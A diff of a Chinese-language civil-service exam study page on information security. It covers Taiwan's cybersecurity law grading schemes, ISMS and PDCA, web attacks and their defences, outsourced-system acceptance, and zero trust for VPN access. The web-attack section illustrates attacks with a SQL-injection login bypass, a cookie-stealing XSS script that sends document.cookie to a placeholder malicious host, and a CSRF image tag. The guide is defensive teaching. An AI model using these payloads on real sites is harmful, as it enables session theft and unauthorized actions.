+          <tr><td><strong>③ 資通系統分級</strong></td><td>依<strong>機密性、完整性、可用性</strong>受損之影響，將系統分為<strong>高、中、普、低</strong>四級，採行對應防護基準</td></tr>
+          <tr><td><strong>④ 事件通報與應變</strong></td><td>知悉資安事件後應於<strong>規定時限內通報</strong>；事件依影響程度分 <strong>1～4 級</strong>，<strong>3、4 級為重大事件</strong>須提出<strong>調查、處理及改善報告</strong></td></tr>
+          <tr><td><strong>⑤ 人力與資源</strong></td><td>配置<strong>資安專責人員</strong>；編列預算；辦理<strong>資安教育訓練與時數要求</strong></td></tr>
+          <tr><td><strong>⑥ 稽核與演練</strong></td><td>定期辦理<strong>內部稽核</strong>；受主管機關<strong>稽核</strong>；辦理<strong>社交工程演練</strong>與<strong>攻防演練</strong></td></tr>
+          <tr><td><strong>⑦ 委外管理</strong></td><td>委外辦理資通系統之建置、維運或服務時，應<strong>監督受託者之資安維護情形</strong>，並於契約中明定資安責任</td></tr>
+          <tr><td><strong>⑧ 獎懲</strong></td><td>對績效優良者獎勵；違失者依規定議處</td></tr>
+        </table></div>
+        <div class="warn"><span class="t">⚠️ 最容易混淆的兩套分級（考題最愛考）</span>
+        <strong>機關資安責任等級：A、B、C、D、E 五級</strong>（依機關重要性）<br>
+        <strong>資安事件等級：1、2、3、4 級</strong>（依事件影響程度，3、4 級為重大）<br>
+        <strong>資通系統防護等級：高、中、普、低 四級</strong>（依系統受損影響）<br><br>
+        <u>三者各自獨立，切勿混用。</u>作答時<strong>時限寫「規定時限內」最安全</strong>，不必冒險背精確時數。</div>
+
+        <strong>📊 二、ISMS 與 PDCA</strong>
+        <div class="table-wrap"><table>
+          <tr><th>項目</th><th>內容</th></tr>
+          <tr><td>ISMS 全稱</td><td><strong>Information Security Management System</strong>，資訊安全管理系統</td></tr>
+          <tr><td>定義</td><td>以<strong>風險管理</strong>為基礎，涵蓋<strong>政策、組織、程序、人員與技術</strong>的一套<strong>系統化管理制度</strong></td></tr>
+          <tr><td>國際標準</td><td><strong>ISO/IEC 27001</strong>（管理系統要求）；<strong>ISO/IEC 27002</strong>（控制措施實施指引）</td></tr>
+          <tr><td><strong>核心觀念</strong></td><td><strong>資安是「管理問題」而非單純「技術問題」</strong>——買再多設備，若無制度與人員配合仍然無效</td></tr>
+          <tr><td>三大目標</td><td><strong>機密性（C）、完整性（I）、可用性（A）</strong></td></tr>
+        </table></div>
+        <pre>              ┌──────────────────┐
+              │   Plan（規劃）   │ ──┐
+              └──────────────────┘   │
+                       ↓             │
+              ┌──────────────────┐   │  持續改善
+              │    Do（執行）    │   │  的循環
+              └──────────────────┘   │
+                       ↓             │
+              ┌──────────────────┐   │
+              │  Check（查核）   │   │
+              └──────────────────┘   │
+                       ↓             │
+              ┌──────────────────┐   │
+              │   Act（行動）    │ ──┘
+              └──────────────────┘</pre>
+        <div class="table-wrap"><table>
+          <tr><th>階段</th><th>資安管理上的具體作為</th></tr>
+          <tr><td><strong>P</strong> 規劃</td><td>界定範圍、<strong>資產盤點與分類</strong>、<strong>風險評鑑</strong>（識別、分析、評估）、決定風險處理方式（<strong>降低／轉移／避免／接受</strong>）、訂定<strong>資安政策</strong>與控制措施</td></tr>
+          <tr><td><strong>D</strong> 執行</td><td>實施控制措施、<strong>教育訓練與認知宣導</strong>、建立作業程序與紀錄</td></tr>
+          <tr><td><strong>C</strong> 查核</td><td><strong>內部稽核</strong>、<strong>管理審查</strong>、資安<strong>績效指標（KPI）</strong>量測、<strong>演練</strong>結果檢視、弱點掃描</td></tr>
+          <tr><td><strong>A</strong> 行動</td><td>矯正與預防措施、<strong>持續改善</strong>、更新政策與計畫，回到下一輪 Plan</td></tr>
+        </table></div>
+        <p style="font-size:.88rem"><strong>關鍵論述</strong>：PDCA 強調<strong>資安不是一次性專案，而是持續運作的循環</strong>——威脅環境與業務都在變，控制措施必須隨之調整。</p>
+
+        <strong>📊 三、資通安全維護計畫之重點事項</strong>
+        <div class="table-wrap"><table>
+          <tr><th>面向</th><th>重點事項</th></tr>
+          <tr><td><strong>組織與權責</strong></td><td>成立<strong>資安推動組織</strong>；明定<strong>資安長</strong>與專責人員之權責；定期召開會議</td></tr>
+          <tr><td><strong>資產與風險</strong></td><td><strong>資通系統與資訊資產盤點分類</strong>；<strong>系統分級</strong>；定期<strong>風險評鑑</strong>與處理計畫</td></tr>
+          <tr><td><strong>人員管理</strong></td><td>任用與離職之<strong>權限管控</strong>（<u>離職即停用帳號</u>）；<strong>保密義務</strong>；<strong>教育訓練時數</strong>；權責分工與職務區隔</td></tr>
+          <tr><td><strong>存取控制</strong></td><td><strong>最小權限</strong>、<strong>定期權限複核</strong>、<strong>特權帳號管理</strong>、身分驗證（MFA）、帳號生命週期管理</td></tr>
+          <tr><td><strong>系統與網路防護</strong></td><td>網段區隔、防火牆、端點防護、<strong>修補管理</strong>、組態管理、<strong>安全開發（含委外系統之安全需求）</strong></td></tr>
+          <tr><td><strong>實體安全</strong></td><td>機房門禁、環境監控（電力、空調、消防）、設備報廢時之<strong>資料清除</strong></td></tr>
+          <tr><td><strong>事件通報與應變</strong></td><td>通報流程與窗口、應變小組、<strong>演練</strong>、<strong>營運持續計畫（BCP）</strong>與<strong>災害復原（DRP）</strong></td></tr>
+          <tr><td><strong>備份與復原</strong></td><td>備份策略（<strong>3-2-1、離線備份</strong>）、<strong>定期還原演練</strong>、RTO／RPO 目標</td></tr>
+          <tr><td><strong>委外管理</strong></td><td>契約明定<strong>資安責任、保密、原始碼交付、驗收之資安檢測、退場條款</strong>；<strong>監督受託者</strong>執行情形</td></tr>
+          <tr><td><strong>稽核與改善</strong></td><td>內部稽核計畫、<strong>缺失追蹤與改善</strong>、管理審查、實施情形陳報</td></tr>
+          <tr><td>法規遵循</td><td>個資法、檔案法、政府資訊公開法等之遵循檢核</td></tr>
+        </table></div>
+
+        <div class="hl"><span class="t">✍️ 必寫拿分點</span>
+        1. <strong>三套分級不可混淆</strong>：機關 A～E、事件 1～4、系統 高中普低——寫對就贏一半<br>
+        2. 通報寫<strong>「規定時限內」</strong>，並補<strong>「3、4 級須提改善報告」</strong><br>
+        3. <strong>委外管理與監督受託者</strong>是資安法的重要條文，也是機關實務痛點，務必寫<br>
+        4. ISMS 要點出<strong>「資安是管理問題不是技術問題」</strong>與 <strong>ISO 27001</strong><br>
+        5. PDCA <strong>四階段各要有具體資安作為</strong>；<strong>Plan 階段的風險評鑑</strong>是核心<br>
+        6. 維護計畫重點<strong>至少寫八個面向</strong>；<strong>離職帳號停用</strong>、<strong>定期權限複核</strong>、<strong>還原演練</strong>是很實務的加分句
+        </div>
       </div>
     </details>
   </div>
@@ -1211,58 +1416,78 @@
     </div>
     <details><summary>看答題架構</summary>
       <div class="ans">
-        <div class="frame"><span class="t">建議結構</span>
-        <strong>一、三種攻擊之原理與差異</strong><br>
-        　（一）<strong>SQL Injection</strong><br>
-        　　　‧ 原理：應用程式將使用者輸入<strong>直接串接</strong>為 SQL 語句，未將資料與指令分離<br>
-        　　　‧ 範例：輸入 <code>' OR '1'='1</code> 使條件恆真；輸入 <code>admin' --</code> 註解掉密碼條件<br>
-        　　　‧ 危害：資料竊取、竄改、刪除，甚至取得作業系統權限<br>
-        　（二）<strong>XSS（跨站腳本）</strong><br>
-        　　　‧ 原理：將惡意 JavaScript 注入網頁，於<strong>其他使用者的瀏覽器</strong>執行<br>
-        　　　‧ 類型：儲存型（存入資料庫，影響所有瀏覽者）／反射型（藏在 URL）／DOM 型<br>
-        　　　‧ 危害：竊取 Cookie 與 Session、竄改頁面、釣魚、鍵盤側錄<br>
-        　（三）<strong>CSRF（跨站請求偽造）</strong><br>
-        　　　‧ 原理：誘使<u>已登入</u>的使用者之瀏覽器，<strong>自動帶著既有憑證</strong>發出非其本意的請求<br>
-        　　　‧ 危害：以受害者身分執行操作（變更資料、轉帳、修改權限）<br>
-        　（四）<strong>三者之差異對照表</strong>（攻擊對象／根本成因／是否需執行腳本／防禦重點）<br>
-        　（五）關鍵區辨：<br>
-        　　　‧ <strong>SQL Injection 攻擊「伺服器與資料庫」</strong><br>
-        　　　‧ <strong>XSS 攻擊「其他使用者的瀏覽器」——偷你的身分</strong><br>
-        　　　‧ <strong>CSRF 攻擊「使用者的既有登入狀態」——借你的手</strong><br><br>
-        <strong>二、防範措施</strong>（分別列出，並標明何者為根本解）<br>
-        　（一）SQL Injection：<br>
-        　　　1. <strong>參數化查詢（Prepared Statement）</strong>← 根本解<br>
-        　　　2. ORM 框架；輸入驗證採白名單<br>
-        　　　3. 資料庫帳號<strong>最小權限</strong>；錯誤訊息不外露<br>
-        　　　4. WAF（輔助）<br>
-        　（二）XSS：<br>
-        　　　1. <strong>輸出編碼（Output Encoding）</strong>，依輸出位置（HTML／屬性／JS／URL）採不同編碼 ← 根本解<br>
-        　　　2. <strong>CSP（內容安全政策）</strong>限制可執行之腳本來源<br>
-        　　　3. Cookie 設定 <strong>HttpOnly</strong>（降低 Cookie 遭竊風險）<br>
-        　　　4. 輸入驗證、富文本採白名單過濾<br>
-        　（三）CSRF：<br>
-        　　　1. <strong>CSRF Token</strong>（每次表單附帶隨機權杖，伺服器驗證）← 根本解<br>
-        　　　2. <strong>SameSite Cookie</strong> 屬性<br>
-        　　　3. 重要操作要求<strong>重新驗證</strong>或二次確認<br>
-        　　　4. 檢查 Referer／Origin 標頭（輔助）<br>
-        　（四）注意：<strong>HttpOnly 對 CSRF 無效</strong>——CSRF 不需讀取 Cookie，瀏覽器會自動帶上。此區辨是加分點<br><br>
-        <strong>三、委外採購與驗收之安全確保</strong><br>
-        　（一）<strong>需求階段</strong>：<br>
-        　　　1. 於<strong>需求規格書</strong>明定應遵循之安全開發規範（如 OWASP ASVS）<br>
-        　　　2. 明定應通過之檢測項目與標準（如不得存在 OWASP Top 10 之高風險弱點）<br>
-        　（二）<strong>契約階段</strong>：<br>
-        　　　1. 納入<strong>資安條款</strong>：保密義務、人員安全查核、資料不得攜出<br>
-        　　　2. 約定<strong>保固期間之漏洞修補義務</strong>與回應時限<br>
-        　　　3. 依《<strong>政府採購法</strong>》辦理，明定驗收標準與違約處理<br>
-        　（三）<strong>開發階段</strong>：定期查核、要求提供<strong>源碼檢測（SAST）</strong>報告、第三方元件清單（<strong>SBOM</strong>）<br>
-        　（四）<strong>驗收階段</strong>：<br>
-        　　　1. 委由<strong>獨立第三方</strong>執行弱點掃描與<strong>滲透測試</strong>（避免球員兼裁判）<br>
-        　　　2. 高風險弱點<strong>修補完成並複測通過</strong>後始得驗收<br>
-        　　　3. 確認測試資料已清除、預設帳號已停用或變更<br>
-        　（五）<strong>上線後</strong>：定期弱點掃描、納入機關資安維護計畫、建立漏洞通報與修補流程<br><br>
-        <strong>四、結論</strong>：網頁攻擊之根因多在於「<strong>未區分資料與指令</strong>」及「<strong>未驗證請求之真實意圖</strong>」；防護應以安全開發為根本，並透過採購契約與驗收機制，將資安要求落實於委外系統全生命週期。
+        <div class="frame"><span class="t">📋 答題骨架</span>
+        一、三種攻擊原理＋<u>對照表</u> → 二、各自防範措施（表）→ 三、委外採購與驗收（表，分「規劃／招標／開發／驗收／維運」）
         </div>
-        <strong>💡 拿分關鍵</strong>：三種攻擊要<strong>清楚區分攻擊對象</strong>（資料庫／其他使用者瀏覽器／使用者登入狀態）。第三小題的委外管理是公部門特色考點，能把「需求—契約—開發—驗收—上線」五階段寫出來就是高分。
+
+        <strong>📊 一、三種攻擊的原理</strong>
+        <div class="table-wrap"><table>
+          <tr><th>攻擊</th><th>攻擊目標</th><th>受害者</th><th>核心原理</th></tr>
+          <tr><td><strong>SQL Injection</strong></td><td><strong>資料庫</strong></td><td>伺服器端資料</td><td>輸入被<strong>當成 SQL 指令執行</strong>——資料與指令的界線消失</td></tr>
+          <tr><td><strong>XSS</strong><br>（跨站腳本）</td><td><strong>其他使用者的瀏覽器</strong></td><td><strong>其他使用者</strong></td><td>輸入被<strong>當成 HTML／JavaScript 執行</strong>，在受害者瀏覽器中執行攻擊者的腳本</td></tr>
+          <tr><td><strong>CSRF</strong><br>（跨站請求偽造）</td><td><strong>使用者已登入的網站</strong></td><td>使用者的<strong>帳號權限</strong></td><td><strong>盜用使用者已通過驗證的身分</strong>，誘使其瀏覽器發出非本意的請求</td></tr>
+        </table></div>
+        <pre>【SQL Injection】
+  輸入： ' OR '1'='1' --
+  組成： SELECT * FROM 使用者 WHERE 帳號='' OR '1'='1' --' AND 密碼=''
+                                        └─ 恆真 ─┘ └ 後面被註解 ┘
+  → 未輸入密碼即可登入
+
+【XSS（儲存型）】
+  攻擊者在留言板輸入： <script>fetch('http://惡意站/?c='+document.cookie)</script>
+  → 網站原樣存入資料庫並回顯
+  → 其他使用者瀏覽該頁時，腳本在【他們的瀏覽器】執行 → Cookie 被竊
+
+【CSRF】
+  受害者已登入公文系統（瀏覽器持有有效的 Session Cookie）
+  同時開啟攻擊者的網頁，其中藏有：
+      <img src="https://公文系統/transfer?to=攻擊者&amount=1000">
+  → 瀏覽器【自動附上 Cookie】發出請求 → 伺服器誤認為本人操作</pre>
+        <div class="table-wrap"><table>
+          <tr><th>比較點</th><th>SQL Injection</th><th>XSS</th><th>CSRF</th></tr>
+          <tr><td>惡意內容執行於</td><td><strong>資料庫伺服器</strong></td><td><strong>受害者瀏覽器</strong></td><td><strong>目標網站伺服器</strong></td></tr>
+          <tr><td>是否需受害者已登入</td><td>否</td><td>否</td><td><strong>是</strong>（必須有有效登入狀態）</td></tr>
+          <tr><td>攻擊者能否看到回應</td><td>可（除盲注外）</td><td>可（透過腳本回傳）</td><td><strong>通常不能</strong>（僅能觸發動作）</td></tr>
+          <tr><td>信任關係被濫用的方向</td><td>伺服器信任<strong>輸入</strong></td><td>使用者信任<strong>網站</strong></td><td>網站信任<strong>使用者的瀏覽器</strong></td></tr>
+        </table></div>
+        <p style="font-size:.88rem"><strong>XSS 三種型態</strong>：<strong>儲存型</strong>（存入資料庫，影響最廣）／<strong>反射型</strong>（藏在 URL 參數，須誘騙點擊）／<strong>DOM 型</strong>（前端 JS 處理不當，不經伺服器）。</p>
+
+        <strong>📊 二、防範措施</strong>
+        <div class="table-wrap"><table>
+          <tr><th>攻擊</th><th>根本防護</th><th>輔助措施</th></tr>
+          <tr><td><strong>SQL Injection</strong></td><td><strong>參數化查詢／預備語句</strong>（Prepared Statement）——SQL 結構先編譯，參數永遠只當資料</td><td>‧ ORM 或預存程序（<u>但其內部不可再動態組字串</u>）<br>‧ 輸入白名單驗證<br>‧ <strong>資料庫帳號最小權限，不得用 sa／root</strong><br>‧ 錯誤訊息不外洩</td></tr>
+          <tr><td><strong>XSS</strong></td><td><strong>輸出編碼（Output Encoding）</strong>——依輸出位置（HTML 內文／屬性／JS／URL）採<strong>對應的編碼方式</strong></td><td>‧ 輸入驗證與 <strong>HTML 淨化（Sanitize）</strong><br>‧ <strong>CSP</strong>（內容安全政策）限制可執行的腳本來源<br>‧ Cookie 加 <strong>HttpOnly</strong>（使 JS 讀不到）、<strong>Secure</strong><br>‧ 使用會自動跳脫的樣板引擎</td></tr>
+          <tr><td><strong>CSRF</strong></td><td><strong>CSRF Token</strong>——每個表單帶一個<strong>隨機且與使用者工作階段綁定</strong>的權杖，伺服器端驗證</td><td>‧ Cookie 設 <strong>SameSite=Strict／Lax</strong><br>‧ 驗證 Referer／Origin 標頭<br>‧ <strong>敏感操作要求重新輸入密碼或二次驗證</strong><br>‧ <strong>變更狀態的操作一律用 POST，不可用 GET</strong></td></tr>
+        </table></div>
+        <div class="hl">
+          <strong>三句話總結：</strong><br>
+          SQL Injection → <strong>「參數化查詢」</strong>（別讓資料變成指令）<br>
+          XSS → <strong>「輸出編碼」</strong>（別讓資料變成畫面上的程式碼）<br>
+          CSRF → <strong>「Token 驗證」</strong>（確認請求真的是從我的網站發出的）
+        </div>
+        <div class="warn"><span class="t">⚠️ 常見錯誤觀念</span>
+        <strong>XSS 的防護重點在「輸出」不在「輸入」。</strong>同一份資料輸出到 HTML、屬性、JavaScript 需要<u>不同的編碼方式</u>；只在輸入時過濾，換個輸出位置就可能被繞過。</div>
+
+        <strong>📊 三、委外開發之採購與驗收</strong>
+        <div class="table-wrap"><table>
+          <tr><th>階段</th><th>應辦事項</th></tr>
+          <tr><td><strong>① 需求規劃</strong></td><td>將<strong>資安需求明列於需求規格書</strong>（不可只寫「須符合資安規定」）：<br>‧ 明定應符合 <strong>OWASP Top 10</strong> 防護<br>‧ 依系統分級（高／中／普／低）採行對應<strong>安全防護基準</strong><br>‧ 個資處理、加密、日誌與稽核軌跡之要求</td></tr>
+          <tr><td><strong>② 招標與契約</strong></td><td>‧ 明定<strong>安全開發生命週期（SSDLC）</strong>要求<br>‧ 約定<strong>原始碼交付</strong>與<strong>智慧財產權歸屬</strong><br>‧ 明定<strong>資安責任、保密義務與違約處理</strong><br>‧ 約定<strong>保固期內漏洞修補之時限</strong><br>‧ <strong>退場條款與資料可攜</strong>，避免廠商鎖定<br>‧ 要求人員背景與資格；<u>限制再委外</u></td></tr>
+          <tr><td><strong>③ 開發期間</strong></td><td>‧ <strong>開發、測試、正式環境分離</strong><br>‧ <strong>測試環境不得使用真實個資</strong><br>‧ 階段性檢視；必要時辦理<strong>程式碼審查</strong></td></tr>
+          <tr><td><strong>④ 驗收（關鍵）</strong></td><td>‧ <strong>弱點掃描</strong>（自動化工具）＋<strong>滲透測試</strong>（人工），<u>並將報告列為驗收文件</u><br>‧ <strong>原始碼檢測</strong>（靜態分析 SAST）<br>‧ <strong>發現之高風險項目須修補完成並複測通過始得驗收</strong><br>‧ 檢查是否留有<strong>測試帳號、預設密碼、除錯訊息</strong><br>‧ 確認<strong>日誌與稽核軌跡</strong>功能完備</td></tr>
+          <tr><td><strong>⑤ 上線與維運</strong></td><td>‧ 上線後<strong>定期弱點掃描</strong>與漏洞修補<br>‧ 廠商維護人員之<strong>帳號權限管控與存取紀錄</strong><br>‧ 系統異動須經<strong>變更管理</strong>程序<br>‧ 納入機關<strong>資通安全維護計畫</strong>之管理範圍</td></tr>
+        </table></div>
+        <div class="hl"><strong>機關實務的關鍵一句：資安要求必須「寫進契約、列入驗收項目」，否則廠商沒有義務做，事後也無從要求。</strong></div>
+
+        <div class="hl"><span class="t">✍️ 必寫拿分點</span>
+        1. 三種攻擊要<strong>各寫出實際的攻擊字串或程式碼</strong>——只講定義拿不到高分<br>
+        2. <strong>對照表務必含「惡意內容執行於何處」與「信任關係方向」</strong>——最能顯示真的理解差異<br>
+        3. 三個根本解要明確：<strong>參數化查詢／輸出編碼／CSRF Token</strong><br>
+        4. 指出 <strong>「XSS 防護在輸出不在輸入」</strong>、<strong>「CSRF 需受害者已登入」</strong><br>
+        5. 補充 <strong>HttpOnly、SameSite、CSP</strong> 等具體設定<br>
+        6. 第三小題要<strong>分階段</strong>，並強調<strong>「弱點掃描與滲透測試報告列為驗收文件」</strong>與<strong>「高風險須修補複測後始得驗收」</strong><br>
+        7. 加分：<strong>測試環境不得使用真實個資</strong>、<strong>檢查殘留測試帳號與預設密碼</strong>
+        </div>
       </div>
     </details>
   </div>
@@ -1276,52 +1501,93 @@
     </div>
     <details><summary>看答題架構</summary>
       <div class="ans">
-        <div class="frame"><span class="t">建議結構</span>
-        <strong>一、傳統邊界防護之侷限</strong><br>
-        　（一）基本假設：「<strong>內網可信、外網不可信</strong>」，如城堡與護城河<br>
-        　（二）失效原因：<br>
-        　　　1. <strong>邊界模糊化</strong>：雲端服務、行動裝置、遠距辦公使資料與使用者不再位於內網<br>
-        　　　2. <strong>一旦突破即長驅直入</strong>：內部缺乏管控，攻擊者可自由<strong>橫向移動</strong><br>
-        　　　3. <strong>內部威脅無法防範</strong>：有權限者本就在牆內<br>
-        　　　4. <strong>憑證竊取</strong>：攻擊者以合法帳號「正常」通過邊界，防火牆無從辨識<br>
-        　　　5. <strong>供應鏈與委外人員</strong>：第三方存取需求難以用網路位置界定<br>
-        　（三）以本機關情境舉例說明（如釣魚郵件導致單一端點失陷即擴散全網）<br><br>
-        <strong>二、零信任架構</strong><br>
-        　（一）核心原則：<strong>Never Trust, Always Verify</strong>——不因位於內網而預設信任<br>
-        　（二）三大支柱：<br>
-        　　　1. <strong>明確驗證</strong>：每次存取皆依<u>身分、裝置狀態、位置、行為、資料敏感度</u>綜合判斷<br>
-        　　　2. <strong>最小權限</strong>：Just-In-Time／Just-Enough-Access，僅授予單次所需權限<br>
-        　　　3. <strong>假設已遭入侵（Assume Breach）</strong>：以微分段限縮爆炸半徑、全面加密、持續監控<br>
-        　（三）主要元件：<br>
-        　　　‧ <strong>身分管理</strong>：SSO、<strong>MFA</strong>、特權帳號管理<br>
-        　　　‧ <strong>裝置信任</strong>：端點健康檢查（修補狀態、防毒、加密）<br>
-        　　　‧ <strong>政策決策點／執行點（PDP／PEP）</strong><br>
-        　　　‧ <strong>微分段（Micro-segmentation）</strong><br>
-        　　　‧ <strong>持續監控與行為分析（UEBA）</strong><br>
-        　　　‧ 資料分類與加密<br>
-        　（四）比較表：傳統 vs 零信任（信任假設／判斷依據／驗證頻率／權限範圍）<br>
-        　（五）導入注意：零信任是<strong>架構理念而非單一產品</strong>，須<strong>分階段導入</strong>，不可能一次到位<br><br>
-        <strong>三、遠端存取改善建議</strong><br>
-        　（一）現行 VPN 之風險：<br>
-        　　　1. 僅靠帳密者<strong>極易遭撞庫或釣魚</strong>——VPN 是勒索軟體最常見入口之一<br>
-        　　　2. 連入後取得<strong>大範圍內網存取權</strong>，違反最小權限<br>
-        　　　3. VPN 設備本身之漏洞若未即時修補即成破口<br>
-        　　　4. 個人裝置健康狀態不明<br>
-        　（二）短期改善（成本低、效益高，應優先辦理）：<br>
-        　　　1. <strong>VPN 強制啟用 MFA</strong> ← 最重要的單一措施<br>
-        　　　2. VPN 設備<strong>優先納入修補管理</strong>，訂定緊急修補程序<br>
-        　　　3. 以 ACL 限制 VPN 使用者僅能存取<strong>必要系統與埠</strong>，而非整個內網<br>
-        　　　4. 保留完整連線日誌並納入 SIEM 監控異常（如非上班時間、境外 IP、異常下載量）<br>
-        　　　5. 定期檢視並停用久未使用之帳號<br>
-        　（三）中長期規劃：<br>
-        　　　1. 導入 <strong>ZTNA</strong>（零信任網路存取）逐步取代傳統 VPN，改為<strong>以應用程式為單位</strong>授權<br>
-        　　　2. 建立<strong>裝置健康檢查</strong>機制，未達標準之裝置僅給予受限存取<br>
-        　　　3. 高敏感系統改採<strong>虛擬桌面（VDI）</strong>，資料不落地至個人裝置<br>
-        　　　4. 導入 UEBA 進行行為異常偵測<br>
-        　（四）配套管理措施：訂定<strong>遠距辦公資安規範</strong>（禁止使用公用電腦、家用網路基本要求、螢幕鎖定）、辦理教育訓練、明定資料不得儲存於個人裝置<br><br>
-        <strong>四、結論</strong>：零信任並非否定既有防護，而是在邊界防護之上補強<strong>身分驗證與內部管控</strong>。機關受限於預算與人力，宜採<strong>分階段、風險導向</strong>之導入策略：先以「VPN 加上 MFA 與最小權限」取得最大效益，再逐步演進至 ZTNA。
+        <div class="frame"><span class="t">📋 答題骨架</span>
+        一、邊界防護的侷限（表）→ 二、零信任核心原則＋組成元件（表＋圖）→ 三、VPN 改善建議（表，含<u>分階段導入</u>）
         </div>
-        <strong>💡 拿分關鍵</strong>：第三小題<strong>務必分「短期／中長期」</strong>——公部門有預算與採購限制，能提出「先做便宜有效的（MFA），再規劃大架構」的務實建議，比一味鼓吹新技術更能得分。
+
+        <strong>📊 一、傳統邊界防護的侷限</strong>
+        <div class="table-wrap"><table>
+          <tr><th>侷限</th><th>說明</th></tr>
+          <tr><td><strong>① 假設「內部可信」</strong></td><td>俗稱<strong>「硬殼軟心」</strong>——邊界防禦很強，但<u>一旦突破，內部幾乎不設防</u></td></tr>
+          <tr><td><strong>② 無法防橫向移動</strong></td><td>攻擊者進入內網後可自由探索與提權（本質上就是勒索軟體大規模擴散的原因）</td></tr>
+          <tr><td><strong>③ 邊界日益模糊</strong></td><td><strong>雲端服務、行動辦公、遠距辦公、BYOD、IoT</strong> 使「內外之分」失去意義</td></tr>
+          <tr><td><strong>④ 無法防內部威脅</strong></td><td>離職員工、被盜帳號、心懷不滿之人員——<u>都在「可信的內部」</u></td></tr>
+          <tr><td><strong>⑤ VPN 授權過寬</strong></td><td>傳統 VPN 是「<strong>連上就等於在內網</strong>」，一組帳密外洩即取得大範圍存取權</td></tr>
+          <tr><td>⑥ 缺乏持續驗證</td><td>只在<strong>登入時驗證一次</strong>，之後不再檢查；工作階段被劫持也不會發現</td></tr>
+        </table></div>
+
+        <strong>📊 二、零信任架構</strong>
+        <div class="frame">
+          <span class="t">📐 一句話定義</span>
+          <strong>「永不信任，一律驗證」（Never Trust, Always Verify）</strong><br>
+          不因為「來自內網」就給予信任；<strong>每一次存取都要重新驗證身分、設備與情境</strong>。
+        </div>
+        <div class="table-wrap"><table>
+          <tr><th>核心原則</th><th>說明</th></tr>
+          <tr><td><strong>① 明確驗證</strong></td><td>每次存取都依<strong>身分、設備狀態、位置、時間、行為</strong>等多重信號綜合判斷</td></tr>
+          <tr><td><strong>② 最小權限</strong></td><td><strong>只給完成當下工作所需的最小權限</strong>，並採<strong>及時（JIT）與剛好夠用（JEA）</strong>之授權</td></tr>
+          <tr><td><strong>③ 假設已遭入侵</strong></td><td>以<strong>微分段</strong>限制爆炸半徑；<strong>全程加密</strong>；持續監控與分析</td></tr>
+          <tr><td>④ 持續評估</td><td>信任<strong>不是一次性的</strong>——工作階段期間持續評估風險，異常即降權或中斷</td></tr>
+        </table></div>
+        <pre>            ┌─────────────────────────────────┐
+   使用者 ──►│      政策執行點（PEP）           │──► 資源
+   設備   ──►│   （每次存取都要經過這裡）        │    （應用、資料）
+            └───────────────┬─────────────────┘
+                            │ 詢問「可以嗎？」
+                            ▼
+            ┌─────────────────────────────────┐
+            │      政策決策點（PDP）           │
+            │  綜合判斷下列信號後決定准駁：      │
+            │   ‧ 身分（IAM、MFA）             │
+            │   ‧ 設備健康（是否加密、有無更新）│
+            │   ‧ 情境（位置、時間、風險評分）  │
+            │   ‧ 資料敏感度                   │
+            └─────────────────────────────────┘</pre>
+        <div class="table-wrap"><table>
+          <tr><th>主要組成元件</th><th>作用</th></tr>
+          <tr><td><strong>身分與存取管理（IAM）</strong></td><td>單一身分來源、<strong>MFA</strong>、單一登入（SSO）、特權帳號管理</td></tr>
+          <tr><td><strong>設備信任</strong></td><td>設備盤點與註冊；檢查<strong>加密、修補狀態、防護軟體</strong>；不合規設備<strong>不得存取</strong></td></tr>
+          <tr><td><strong>政策決策點（PDP）／執行點（PEP）</strong></td><td>集中制定政策、於每個存取路徑上執行</td></tr>
+          <tr><td><strong>微分段（Micro-segmentation）</strong></td><td>將網路細分至<strong>工作負載層級</strong>，限制橫向移動</td></tr>
+          <tr><td><strong>資料保護</strong></td><td>資料分類分級、加密、<strong>DLP</strong>、權限管理</td></tr>
+          <tr><td><strong>監控與分析</strong></td><td>SIEM／<strong>UEBA</strong>（使用者與實體行為分析）、持續風險評分、自動化回應（SOAR）</td></tr>
+          <tr><td>加密</td><td><strong>所有流量加密</strong>，包含內網東西向流量</td></tr>
+        </table></div>
+        <p style="font-size:.88rem"><strong>重要提醒</strong>：<strong>零信任是一種「架構理念」與「導入歷程」，不是一項可以採購的產品。</strong>宜<strong>分階段推動</strong>，先從身分與設備做起。</p>
+
+        <strong>📊 三、VPN 遠端存取架構改善建議</strong>
+        <div class="table-wrap"><table>
+          <tr><th>現況問題</th><th>改善方向</th></tr>
+          <tr><td>僅帳號密碼驗證</td><td><strong>強制全面 MFA</strong>——這是投報率最高、最該優先做的一項</td></tr>
+          <tr><td>連上即取得大範圍內網存取</td><td>改採<strong>ZTNA／SDP（軟體定義邊界）</strong>：<strong>僅開放到「特定應用」而非整個網段</strong>；資源對未授權者<strong>不可見</strong></td></tr>
+          <tr><td>不檢查連線設備</td><td>加入<strong>設備健康檢查</strong>：作業系統更新、防毒、磁碟加密、是否為機關配發設備；<strong>不合規則拒絕或限縮權限</strong></td></tr>
+          <tr><td>權限一體適用</td><td>依<strong>角色</strong>與<strong>資料敏感度</strong>分級授權；特權操作另需<strong>跳板機</strong>與<strong>錄影稽核</strong></td></tr>
+          <tr><td>缺乏監控</td><td>連線<strong>全程記錄</strong>；異常時段、異常地點、異常流量<strong>告警</strong>；工作階段<strong>閒置逾時自動登出</strong></td></tr>
+          <tr><td>VPN 設備本身的風險</td><td>VPN 設備漏洞是近年主要入侵管道 → <strong>優先修補</strong>、關閉不必要功能、訂閱漏洞通報</td></tr>
+        </table></div>
+        <div class="table-wrap"><table>
+          <tr><th>分階段導入建議</th><th>內容</th></tr>
+          <tr><td><strong>第一階段（立即）</strong></td><td><strong>全面 MFA</strong>＋VPN 設備修補＋<strong>連線日誌集中監控</strong>＋帳號權限盤點與離職帳號清查</td></tr>
+          <tr><td><strong>第二階段（短期）</strong></td><td>設備健康檢查；依角色細分授權；建立<strong>跳板機</strong>管理特權存取</td></tr>
+          <tr><td><strong>第三階段（中長期）</strong></td><td>導入 <strong>ZTNA</strong> 取代傳統 VPN；<strong>微分段</strong>；行為分析與自動化回應</td></tr>
+        </table></div>
+        <div class="table-wrap"><table>
+          <tr><th>配套管理措施</th><th>說明</th></tr>
+          <tr><td>制度面</td><td>訂定<strong>遠距辦公資安規範</strong>：可存取之系統範圍、禁止事項、資料不得另存個人設備</td></tr>
+          <tr><td>個資與機密</td><td>涉個資或機密之系統<strong>應限制遠端存取</strong>，或加強驗證與稽核</td></tr>
+          <tr><td>教育訓練</td><td>家用網路安全、公共 Wi-Fi 風險、釣魚辨識</td></tr>
+          <tr><td>可用性</td><td>VPN 為單點時應規劃<strong>備援</strong>，避免遠距辦公全面中斷</td></tr>
+        </table></div>
+
